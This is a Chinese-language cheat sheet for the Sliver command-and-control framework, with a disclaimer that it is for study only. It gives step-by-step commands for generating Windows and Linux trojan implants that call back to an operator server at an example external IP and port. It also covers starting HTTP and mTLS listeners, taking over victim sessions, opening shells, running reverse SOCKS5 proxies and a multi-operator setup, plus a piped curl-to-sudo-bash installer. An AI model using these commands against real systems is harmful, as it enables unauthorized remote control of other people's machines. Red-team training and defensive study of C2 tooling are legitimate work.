# sliver

---

## 免责声明

`本文档仅供学习和研究使用,请勿使用文中的技术源码用于非法用途,任何人造成的任何负面影响,与本人无关.`

---

**项目地址**
- https://github.com/BishopFox/sliver

**使用文档**
- https://github.com/BishopFox/sliver/wiki

**相关文章**
- [sliver c2代码的学习](https://x.hacking8.com/post-445.html)

---

## 安装

**官方一条命令版**
```bash
# 安装
curl https://sliver.sh/install|sudo bash

# 连接(默认连接本地服务器)
sliver

# 如果默认连接本地失败,可能是服务没有开启,手动开启再连接即可
systemctl start sliver
sliver
```

---

## 使用

连接服务器后会进去到类似 pupy 的命令行交互界面,使用方法其实差不多

sliver 自 1.5 版本开始,支持2种操作模式 `Session Mode`/`Beacon Mode`

`Beacon Mode` 实现了一种异步通信方式，在这种方式中，木马程序定期检查服务器检索任务、执行它们并返回结果。

`Session Mode` 木马程序将根据底层 C2 协议使用持久连接或使用长轮询创建交互式实时会话。

### 生成 shell (http)

**Session Mode**
```bash
generate -h
generate --http example.com --save /tmp

# 指定平台
generate --http example.com --save /tmp --os win
generate --http example.com --save /tmp --os linux
```

**Beacon Mode**
```bash
generate beacon --http example.com --save /tmp
```

**启动监听器**
```bash
http -h
http --domain example.com

# 查看当前的监听器
jobs

# 关闭监听器
jobs -k [int]
```

**示例**

比如我服务器的外网 ip 为 1.14.5.14 ,监听器在 1919 端口,生成一个 windows 的木马
```bash
generate --http http://1.14.5.14:1919 --save /tmp --os win

# 开启一个基于 http 1919 端口的C2
http -l 1919
```

### 生成 shell (mtls)

```bash
generate --mtls example.com --save /tmp --os win
```

**启动监听器**
```bash
mtls
jobs
```

### 进入 shell

当有主机上线后,控制台会有log提示,我们可以运行 `sessions` 查看可控制的机器列表

```bash
sessions
```

使用 `use` 后面跟 session id 指定要控制的目标主机

```
use [session id]
```

选中 sessions 后,我们可用2种控制模式

**interactive**

交互式会话，在 sliver 中某些命令，例如 `shell` `portfwd` 仅适用于交互式会话

```bash
# 在选中 sessions 后 (仅beacon模式可用)
interactive

close
```

**shell**
```bash
# 在选中 sessions 后
shell
```

### socks5

- https://github.com/BishopFox/sliver/wiki/Reverse-SOCKS
- https://github.com/BishopFox/sliver/tree/master/client/command/socks

**开启 socks5 代理**
```bash
# 在进入 sessions 后 (仅 session 模式可用)
socks5 start

# 默认监听在 127.0.0.1 可自行指定监听的ip、端口、配置socks5认证
socks5 start --help
```

**关闭 socks5 代理**
```bash
socks5 stop -i [ID]
```

---

## 多人运动

- https://github.com/BishopFox/sliver/wiki/Multiplayer-Mode

**服务端**
```bash
/root/sliver-server operator --name f8x --lhost [服务端ip] --save f8x.cfg
```

**用户端**
```bash
# 导入服务端生成的配置文件
sliver import ./f8x.cfg

# 再次启动会让你选择使用哪个 server
sliver
```

## GUI

- https://github.com/BishopFox/sliver-gui

使用和命令行 client 端一样,从服务端下载 cfg 文件导入即可
